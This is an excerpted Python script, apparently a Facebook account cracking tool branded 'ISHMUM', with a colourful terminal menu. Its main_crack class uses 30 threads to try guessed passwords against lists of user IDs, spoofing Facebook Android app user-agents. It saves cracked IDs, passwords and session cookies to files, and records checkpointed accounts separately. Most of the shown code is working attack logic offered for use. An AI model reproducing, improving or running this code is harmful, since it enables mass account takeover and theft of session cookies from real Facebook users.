...
os.system('clear')
print('    \x1b[1;96m      \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m \x1b[1;96m WELCOME TO ISHMUM COMMAND  \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m\n')
print('  \x1b[0m ╭──────────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0mISHMUM Command \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ─────────────╮')
...
from concurrent.futures import ThreadPoolExecutor as HamzaISHMUM
from string import * 
...
def iAmMethod4Ua():
	...
	ua =random.choice(["",])
	return ua
sys.stdout.write('\x1b]2; ISHMUM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(35*'─')
        input("Press enter to back ISHMUM Menu ")
        exit()
os.system("speak 'WELCOME TO ISHMUM COMMAND'")
def Hamza():   
    os.system('clear')
    print(logo)
    print(35*'─')
    ...
    print(f'[4] Join chat group')
    print(f'[5] Join Whatsapp Group ')
    print(f'[6] Join Facebook Group ')
    print(35*'─')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ISHMUM] {loop} [M-1] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m]  {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ...
            x1 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/jio;FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-M225FV;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ISHMUMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ISHMUMb};{ckkk}"
                    print(f"\r{R} [ISHMUM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ISHMUM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ISHMUM_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
              #       print(f"\r\x1b[1;96m [ISHMUM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ISHMUM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [ISHMUM] {loop}  [M3] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ...
            fban = random.choice(["FB4A", "FB5A", "FB6A"])
            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
            ishmum_ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/grameenphone;FBMF/Samsung;FBBD/Samsung;FBPN/{fbpn};FBDV/SM-M215F;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ISHMUM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ISHMUM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ISHMUM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r\x1b[1;96m [ISHMUM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ISHMUM] {loop}  [M2] OK/CP [\x1b[1;92m{len(oks)}\x1b[0m | \x1b[1;96m{len(cps)}\x1b[0m] {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
    ...
    def pasw(self):       
            ...
            print("\x1b[0m─────────────────────────────────────")
            with HamzaISHMUM(max_workers=30) as ISHMUMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ISHMUMworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ISHMUMworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ISHMUMworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ISHMUMworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
Hamza()